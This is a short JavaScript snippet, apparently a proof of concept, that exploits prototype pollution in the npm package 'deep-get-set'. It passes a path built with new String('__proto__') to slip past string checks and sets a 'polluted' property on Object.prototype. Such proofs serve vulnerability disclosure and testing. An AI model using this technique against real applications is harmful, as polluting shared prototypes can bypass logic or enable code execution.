 
  const deep = require("deep-get-set");

   

  deep({}, [new String("__proto__"), "polluted"], "yes");
// End of file
